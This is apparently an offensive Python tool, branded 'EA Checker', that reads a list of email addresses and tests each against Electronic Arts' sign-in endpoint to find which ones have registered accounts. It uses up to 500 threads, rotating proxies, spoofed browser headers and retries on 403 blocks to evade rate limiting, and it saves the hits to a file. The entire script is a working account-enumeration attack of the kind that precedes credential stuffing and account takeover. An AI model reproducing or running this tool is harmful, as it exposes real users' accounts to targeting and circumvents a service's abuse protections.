import requests
import random
import time
import os
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from colorama import init, Fore, Style

# Initialize colorama
init()

# Color constants
CYAN = Fore.CYAN
RESET = Style.RESET_ALL
SEPARATOR = "=" * 60

# Updated Configuration with new User Agents
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
]
BASE_URL = "https://signin.ea.com/p/ajax/user/checkEmailExisted"
REFERER_BASE = "https://signin.ea.com/p/juno/create"
EMAILS_FILE = "emails.txt"
PROXIES_FILE = "proxies.txt"
REQUEST_DELAY = (3, 7)
MAX_RETRIES = 3
TIMEOUT = 20

# Global processed counter
processed_counter = 0

class Counter:
    def __init__(self):
        self.valid = 0
        self.invalid = 0
        self.errors = 0
        self.lock = threading.Lock()

    def increment_valid(self):
        with self.lock:
            self.valid += 1

    def increment_invalid(self):
        with self.lock:
            self.invalid += 1

    def increment_error(self):
        with self.lock:
            self.errors += 1

    def get_counts(self):
        with self.lock:
            return self.valid, self.invalid, self.errors

counter = Counter()
FILE_LOCK = threading.Lock()
PRINT_LOCK = threading.Lock()

def load_resources():
    """Load emails and proxies from files"""
    try:
        if not os.path.exists(EMAILS_FILE):
            raise FileNotFoundError(f"{EMAILS_FILE} not found!")

        with open(EMAILS_FILE, 'r') as f:
            emails = [line.strip() for line in f if line.strip()]

        if not emails:
            raise ValueError(f"No valid emails in {EMAILS_FILE}!")

        proxies = []
        if os.path.exists(PROXIES_FILE):
            with open(PROXIES_FILE, 'r') as f:
                proxies = [line.strip() for line in f if line.strip()]
        else:
            print(f"{CYAN}No proxies found in {PROXIES_FILE}, proceeding without proxies{RESET}")

        return emails, proxies

    except Exception as e:
        print(f"EA Checker - Processed: {processed_counter} - Error: {str(e)}")
        raise

def get_headers():
    """Updated headers generation"""
    return {
        "User-Agent": random.choice(USER_AGENTS),
        "Referer": f"{REFERER_BASE}?ts={int(time.time())}",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "X-Requested-With": "XMLHttpRequest",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate",
        "Pragma": "no-cache"
    }

def save_result(email, result_type):
    """Save results to appropriate files"""
    filename = 'hits.txt' if result_type == 'valid' else 'bad.txt'
    with FILE_LOCK:
        with open(filename, 'a') as f:
            f.write(f"{email}\n")

def print_final_status(total):
    """Display final summary only"""
    valid, invalid, errors = counter.get_counts()
    processed = valid + invalid + errors
    
    print(f"\n{SEPARATOR}")
    print(f"{CYAN}Valid: {valid}{RESET}")
    print(f"{CYAN}Invalid: {invalid}{RESET}")
    print(f"{CYAN}Errors: {errors}{RESET}")
    print(f"{CYAN}Processed: {processed}/{total}{RESET}")
    print(SEPARATOR)

def check_email(mail, proxy_pool, total_emails, attempt=0):
    """Email validation logic with retry on failure"""
    global processed_counter
    try:
        if attempt >= MAX_RETRIES:
            counter.increment_error()
            processed_counter += 1
            remaining = total_emails - processed_counter
            valid, invalid, _ = counter.get_counts()
            os.system(f'title EA Checker - Processed: {processed_counter} - Remaining: {remaining} - Valid: {valid} - Invalid: {invalid}')
            return f"{CYAN}Error{RESET}", mail

        proxy = random.choice(proxy_pool) if proxy_pool else None
        params = {
            "requestorId": "portal",
            "email": mail,
            "_": str(int(time.time() * 1000))
        }

        session = requests.Session()
        if proxy:
            session.proxies.update({"http": f"http://{proxy}", "https": f"http://{proxy}"})
            # Print proxy being used
            with PRINT_LOCK:
                print(f"{CYAN}Using proxy: {proxy} for {mail}{RESET}")

        # Initial page visit for cookies
        session.get(REFERER_BASE, headers=get_headers(), timeout=TIMEOUT)
        
        response = session.get(
            BASE_URL,
            headers=get_headers(),
            params=params,
            timeout=TIMEOUT,
            allow_redirects=False
        )

        if response.status_code == 403:
            time.sleep(random.uniform(*REQUEST_DELAY))
            return check_email(mail, proxy_pool, total_emails, attempt + 1)

        response.raise_for_status()
        data = response.json()

        if 'register_email_existed' in data.get('message', ''):
            counter.increment_valid()
            save_result(mail, 'valid')
            processed_counter += 1
            remaining = total_emails - processed_counter
            valid, invalid, _ = counter.get_counts()
            os.system(f'title EA Checker - Processed: {processed_counter} - Remaining: {remaining} - Valid: {valid} - Invalid: {invalid}')
            return f"{CYAN}Valid{RESET}", mail
        else:
            counter.increment_invalid()
            save_result(mail, 'invalid')
            processed_counter += 1
            remaining = total_emails - processed_counter
            valid, invalid, _ = counter.get_counts()
            os.system(f'title EA Checker - Processed: {processed_counter} - Remaining: {remaining} - Valid: {valid} - Invalid: {invalid}')
            return f"{CYAN}Invalid{RESET}", mail

    except Exception as e:
        processed_counter += 1
        remaining = total_emails - processed_counter
        valid, invalid, _ = counter.get_counts()
        os.system(f'title EA Checker - Processed: {processed_counter} - Remaining: {remaining} - Valid: {valid} - Invalid: {invalid}')
        if attempt < MAX_RETRIES - 1:
            time.sleep(random.uniform(*REQUEST_DELAY))
            return check_email(mail, proxy_pool, total_emails, attempt + 1)
        else:
            counter.increment_error()
            with PRINT_LOCK:
                print(f"EA Checker - Processed: {processed_counter} - Error: {str(e)} - Email: {mail}")
            return f"{CYAN}Error{RESET}", mail

def exit_prompt():
    """Handle exit confirmation"""
    while True:
        choice = input(f"\n{CYAN}Do you want to exit? (y/n): {RESET}").lower()
        if choice in ('y', 'yes'):
            return True
        elif choice in ('n', 'no'):
            return False
        print(f"{CYAN}Please enter 'y' or 'n'{RESET}")

def main():
    """Main program flow"""
    global processed_counter
    try:
        os.system('color')
        emails, proxies = load_resources()
        total = len(emails)
        processed_counter = 0  # Reset counter at start
        valid, invalid, _ = counter.get_counts()
        os.system(f'title EA Checker - Processed: {processed_counter} - Remaining: {total} - Valid: {valid} - Invalid: {invalid}')  # Initial title

        while True:
            try:
                thread_count = int(input(rf"""
{CYAN}╔═════════════════════════════════╗
║ _____    add me  @X1_3          ║
║| ____|  / \    __   ___ __ ___  ║
║|  _|   / _ \   \ \ / / '_ ` _ \ ║
║| |___ / ___ \   \ V /| | | | | |║
║|_____/_/   \_\   \_/ |_| |_| |_|║
╚═════════════════════════════════╝
Set thread (1-500): {RESET}"""))
                thread_count = max(1, min(500, thread_count))
                break
            except ValueError:
                print(f"{CYAN}Please enter a valid number between 1-500{RESET}")

        with ThreadPoolExecutor(max_workers=thread_count) as executor:
            futures = {executor.submit(check_email, mail, proxies, total): mail for mail in emails}
            retry_queue = []
            
            for future in as_completed(futures):
                status, mail = future.result()
                with PRINT_LOCK:
                    print(f"{status}: {mail}")
                    if "Error" in status and len(retry_queue) < total:
                        retry_queue.append(mail)

            while retry_queue:
                mail_to_retry = retry_queue.pop(0)
                future = executor.submit(check_email, mail_to_retry, proxies, total)
                status, mail = future.result()
                with PRINT_LOCK:
                    print(f"Retry {status}: {mail}")
                    if "Error" in status and len(retry_queue) < total:
                        retry_queue.append(mail)

        print_final_status(total)
        
        if exit_prompt():
            print(f"{CYAN}Closing program...{RESET}")
        else:
            print(f"{CYAN}Keeping program open...{RESET}")

    except KeyboardInterrupt:
        print_final_status(len(load_resources()[0]))
        if exit_prompt():
            print(f"{CYAN}Closing program...{RESET}")
        else:
            print(f"{CYAN}Keeping program open...{RESET}")
    except Exception as e:
        print(f"EA Checker - Processed: {processed_counter} - Error: {str(e)}")
        if exit_prompt():
            print(f"{CYAN}Closing program...{RESET}")
        else:
            print(f"{CYAN}Keeping program open...{RESET}")

if __name__ == "__main__":
    main()